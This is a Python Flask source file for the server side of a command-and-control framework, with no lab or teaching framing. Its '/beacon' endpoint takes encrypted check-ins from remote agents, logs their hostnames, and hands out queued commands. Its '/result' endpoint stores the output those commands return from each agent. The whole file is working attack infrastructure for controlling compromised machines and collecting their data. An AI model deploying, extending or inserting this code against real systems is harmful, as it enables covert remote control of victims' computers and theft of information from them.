from flask import Blueprint, request, jsonify
from datetime import datetime
from crypto import encrypt, decrypt
import state

c2_api = Blueprint('c2_api', __name__)

@c2_api.route("/beacon", methods=["POST"])
def beacon():
    """The agent sends an encrypted beacon"""
    try:
        # Receive and decrypt the beacon
        encrypted_data = request.json["data"]
        beacon_data = decrypt(encrypted_data)

        agent_id = beacon_data["agent_id"]
        hostname = beacon_data["hostname"]
        
        # Update agent info in state
        beacon_data["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        state.active_agents[agent_id] = beacon_data

        print(f"[+] Beacon received from {hostname} (ID: {agent_id})")

        # Is there a command for this agent?
        command = state.pending_commands.pop(agent_id, None)

        if command:
            print(f"[>] Sending command to {hostname}: {command}")
            response = {"command": command}
        else:
            response = {"command": None}

        # Encrypt the response
        encrypted_response = encrypt(response)
        return jsonify({"data": encrypted_response})

    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"error": str(e)}), 400

@c2_api.route("/result", methods=["POST"])
def result():
    """The agent sends the result of a command"""
    try:
        encrypted_data = request.json["data"]
        result_data = decrypt(encrypted_data)

        agent_id = result_data["agent_id"]
        output = result_data["output"]
        command = result_data.get("command", "unknown")
        
        print(f"\n[RESULT from {agent_id}]:\n{output}\n")

        # Save result with timestamp and command reference
        if agent_id not in state.results:
            state.results[agent_id] = []
            
        state.results[agent_id].append({
            "command": command,
            "output": output,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        return jsonify({"status": "ok"})

    except Exception as e:
        return jsonify({"error": str(e)}), 400
